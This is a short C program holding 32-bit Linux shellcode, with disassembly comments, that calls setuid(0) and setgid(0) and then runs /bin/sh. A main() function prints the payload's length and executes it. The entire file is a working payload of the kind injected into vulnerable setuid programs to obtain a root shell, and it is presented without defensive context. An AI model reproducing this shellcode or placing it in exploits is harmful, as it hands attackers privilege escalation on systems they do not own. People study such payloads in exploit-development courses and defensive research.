#include <stdio.h>

char *shellcode=
		"\xeb\x19"                    /* jmp    0x804807b */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x17"                    /* mov    $0x17,%al */
		"\x31\xdb"                    /* xor    %ebx,%ebx */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x2e"                    /* mov    $0x2e,%al */
		"\x31\xdb"                    /* xor    %ebx,%ebx */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x0b"                    /* mov    $0xb,%al */
		"\x5b"                        /* pop    %ebx */
		"\x89\xd1"                    /* mov    %edx,%ecx */
		"\xcd\x80"                    /* int    $0x80 */
		"\xe8\xe2\xff\xff\xff"        /* call   0x8048062 */
		"\x2f"                        /* das     */
		"\x62\x69\x6e"                /* bound  %ebp,0x6e(%ecx) */
		"\x2f"                        /* das     */
		"\x73\x68"                    /* jae    0x80480ef */
		"";

int main(void)
{
		fprintf(stdout,"Length: %d\n",strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}
